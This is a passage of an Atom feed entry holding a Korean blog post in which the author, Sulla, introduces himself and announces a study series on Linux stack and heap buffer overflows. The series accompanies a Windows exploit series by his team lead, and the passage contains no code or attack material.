      <id>/linux_0x00</id>
      <content type="html" xml:base="/linux_0x00">&lt;h2 id=&quot;0x00---시작에-앞서&quot;&gt;0x00 - 시작에 앞서&lt;/h2&gt;

&lt;p&gt;안녕하세요. &lt;strong&gt;Sulla&lt;/strong&gt;입니다.&lt;/p&gt;

&lt;p&gt;팀장님(Joel-Park)께서 Windows Exploit 주제로 연재를 시작하시면서 저는 Linux 파트를 맡게 되었습니다…… :(&lt;/p&gt;

&lt;h1 id=&quot;뉘신지요&quot;&gt;뉘신지요…?&lt;/h1&gt;

&lt;p&gt;저는 &lt;strong&gt;LINARENA&lt;/strong&gt;에서 활동중인 &lt;strong&gt;김성회&lt;/strong&gt;라고 합니다.
닉네임은 &lt;strong&gt;Sulla&lt;/strong&gt;라는 닉을 사용하고있습니다. 게임 아이디입니다. 게임에서 &lt;strong&gt;Sulla&lt;/strong&gt; 또는 &lt;strong&gt;술라Sulla&lt;/strong&gt; 보시면 아는척 해주세요 :)
관심 분야는 &lt;strong&gt;웹&lt;/strong&gt; / &lt;strong&gt;모바일&lt;/strong&gt; / &lt;strong&gt;시스템&lt;/strong&gt; / &lt;strong&gt;IoT&lt;/strong&gt; 보안에 관심을 갖고 활동중입니다.&lt;/p&gt;

&lt;h1 id=&quot;왜-하나요&quot;&gt;왜 하나요?&lt;/h1&gt;

&lt;p&gt;최근에 bof에 재미를 느끼기 시작 했습니다. 그래서 linux bof 관련 공부 내용을 정리 할 겸 저처럼 해당 내용을 공부하시는 분들에게 좋은 참고 내용이 되기 위해서 포스팅 해볼까 생각이 들었습니다. 
최대한 쉽게 하지만, 탄탄하게 정리해서 연제해 볼까 합니다.&lt;/p&gt;

&lt;h1 id=&quot;뭐-하나요&quot;&gt;뭐 하나요?&lt;/h1&gt;

&lt;p&gt;Window와 마찬가지로 주 내용은 스택, 힙 bof이며 관련한 추가적인 내용들도 함께 다룰까 합니다. 일단은 정해진 일정에 맞춰서 진행 하고 일정 완료 후에도 지속적으로 내용을 업데이트 할 생각입니다.&lt;/p&gt;

&lt;h1 id=&quot;마치며&quot;&gt;마치며…&lt;/h1&gt;

&lt;p&gt;글재주가 많이 부족합니다만, 부디 많은 분들에게 좋은 자료로 쓰이면 좋겠습니다. 
많이들 봐주시고 지적도 많이 해주세요. 화이팅!&lt;/p&gt;

&lt;p&gt;감사합니다.&lt;/p&gt;</content>

      
      
      
      
      

      <author>
          <name>Sulla</name>
        
        
      </author>

      

      
        <category term="Posts" />
      

      
        <summary type="html">0x00 - 시작에 앞서</summary>
      

      
      
    </entry>
  
</feed>
